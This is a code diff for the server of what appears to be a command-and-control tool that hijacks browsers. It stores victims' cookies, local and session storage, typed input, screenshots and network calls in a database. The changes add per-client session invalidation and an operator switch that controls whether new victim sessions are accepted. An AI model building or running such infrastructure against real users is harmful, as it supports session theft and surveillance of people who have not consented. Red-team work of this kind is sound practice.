@@ -189,16 +189,17 @@ MurderCritter = {
 #***************************************************************************
 # Database classes
 class Client(db.Model):
-    id        = db.Column(db.Integer, primary_key=True)
-    nickname  = db.Column(db.String(100), unique=True, nullable=False)
-    uuid      = db.Column(db.String(40), unique=True, nullable=False)
-    notes     = db.Column(db.Text, nullable=True)
-    firstSeen = db.Column(db.DateTime(timezone=True),server_default=func.now())
-    lastSeen  = db.Column(db.DateTime(timezone=True), server_default=func.now())
-    ipAddress = db.Column(db.String(20), nullable=True)
-    platform  = db.Column(db.String(100), nullable=True)
-    browser   = db.Column(db.String(100), nullable=True)
-    isStarred = db.Column(db.Boolean, nullable=False, default=False)
+    id           = db.Column(db.Integer, primary_key=True)
+    nickname     = db.Column(db.String(100), unique=True, nullable=False)
+    uuid         = db.Column(db.String(40), unique=True, nullable=False)
+    sessionValid = db.Column(db.Boolean, nullable=False, default=True)
+    notes        = db.Column(db.Text, nullable=True)
+    firstSeen    = db.Column(db.DateTime(timezone=True),server_default=func.now())
+    lastSeen     = db.Column(db.DateTime(timezone=True), server_default=func.now())
+    ipAddress    = db.Column(db.String(20), nullable=True)
+    platform     = db.Column(db.String(100), nullable=True)
+    browser      = db.Column(db.String(100), nullable=True)
+    isStarred    = db.Column(db.Boolean, nullable=False, default=False)
 
 
     def update(self):
@@ -217,7 +218,7 @@ class Screenshot(db.Model):
     fileName  = db.Column(db.String(100), nullable=False)
   
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<Screenshot {self.id}>'
 
 
 class HtmlCode(db.Model):
@@ -230,7 +231,7 @@ class HtmlCode(db.Model):
 
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<HtmlCode {self.id}>'
 
 
 class UrlVisited(db.Model):
@@ -240,7 +241,7 @@ class UrlVisited(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<UrlVisited {self.id}>'
 
 
 class UserInput(db.Model):
@@ -251,7 +252,7 @@ class UserInput(db.Model):
     timeStamp  = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<UserInput {self.id}>'
 
 
 class Cookie(db.Model):
@@ -262,7 +263,7 @@ class Cookie(db.Model):
     timeStamp   = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<Cookie {self.id}>'
 
 
 class LocalStorage(db.Model):
@@ -273,7 +274,7 @@ class LocalStorage(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<LocalStorage {self.id}>'
 
 
 class SessionStorage(db.Model):
@@ -284,7 +285,7 @@ class SessionStorage(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<SessionStorage {self.id}>'
 
 
 class XhrOpen(db.Model):
@@ -295,7 +296,7 @@ class XhrOpen(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<XhrOpen {self.id}>'
 
 
 class XhrSetHeader(db.Model):
@@ -306,7 +307,7 @@ class XhrSetHeader(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<XhrSetHeader {self.id}>'
 
 
 class XhrCall(db.Model):
@@ -317,7 +318,7 @@ class XhrCall(db.Model):
     timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<XhrCall {self.id}>'
 
 
 class FetchSetup(db.Model):
@@ -328,7 +329,7 @@ class FetchSetup(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<FetchSetup {self.id}>'
 
 
 class FetchHeader(db.Model):
@@ -339,7 +340,8 @@ class FetchHeader(db.Model):
     timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<FetchHeader {self.id}>'
+
 
 class FetchCall(db.Model):
     id           = db.Column(db.Integer, primary_key=True)
@@ -349,7 +351,7 @@ class FetchCall(db.Model):
     timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<FetchCall {self.id}>'
 
 
 class Event(db.Model):
@@ -360,7 +362,7 @@ class Event(db.Model):
     eventID   = db.Column(db.Integer, nullable=False)
 
     def __repr__(self):
-        return f'<Client {self.id}>'
+        return f'<Event {self.id}>'
    
 
 # User C2 UI session
@@ -384,6 +386,16 @@ class User(UserMixin, db.Model):
     def is_anonymous(self):
         # Another unused but required method
         return False
+
+
+
+# Application settings
+class AppSettings(db.Model):
+    id                = db.Column(db.Integer, primary_key=True)
+    allowNewSesssions = db.Column(db.Boolean, default=True)
+
+    def __repr__(self):
+        return f'<AppSettings {self.id}>'
 
 
 #***************************************************************************
@@ -448,14 +460,19 @@ def clientSeen(identifier, ip, userAgent):
 
 
 # Check if the UUID sent by client is valid
+# and hasn't had it's session invalidated
 def isClientSessionValid(identifier):
     client = Client.query.filter_by(uuid=identifier).first()
     if client:
-        # print("!! Valid client UUID!")
-        return true
+        # Ok, valid client UUID. Check if session is still good
+        if (client.sessionValid):
+            return true
+        else:
+            return false
     else:
-        # print("!! Invalid client UUID!")
+        # client UUID not in database, shenanigans I say
         return false
+
 
 
 # Needed by flask-login
@@ -481,6 +498,17 @@ def addAdminUser():
 
     db.session.add(adminUser)
     dbCommit()
+
+
+
+
+# Initialize app defaults
+def initApplicationDefaults():
+    appSettings = AppSettings(allowNewSesssions=True)
+
+    db.session.add(appSettings)
+    dbCommit()
+
 
 
 
@@ -1327,6 +1355,40 @@ def setClientStar(key):
     return "ok", 200
 
 
+
+@app.route('/api/app/allowNewClientSessions', methods=['GET'])
+@login_required
+def getAllowNewClientSessions():
+    appSettngs = AppSettings.query.filter_by(id=1).first()
+
+    # if (appSettngs.allowNewSesssions):
+    #     print("New Sessions allowed!")
+    # else:
+    #     print("New Sessions not allowed")
+
+    newSessionData = {'newSessionsAllowed':appSettngs.allowNewSesssions}
+
+    return jsonify(newSessionData)
+
+
+@app.route('/api/app/setAllowNewClientConnections/<setting>', methods=['GET'])
+@login_required
+def setAllowNewClientSessions(setting):
+    appSettngs = AppSettings.query.filter_by(id=1).first()
+   
+    if (setting != '0' and setting != '1'):
+        return "No.", 401
+    elif setting == '1':
+        appSettngs.allowNewSesssions = True
+    else:
+        appSettngs.allowNewSesssions = False
+
+    dbCommit()
+
+    return "ok", 200
+
+
+
 #**************************************************************************
 
 
@@ -1418,6 +1480,7 @@ if __name__ == '__main__':
             if os.path.exists("./loot"):
                 shutil.rmtree("./loot")
             addAdminUser()
+            initApplicationDefaults()
 
 
     with app.app_context():
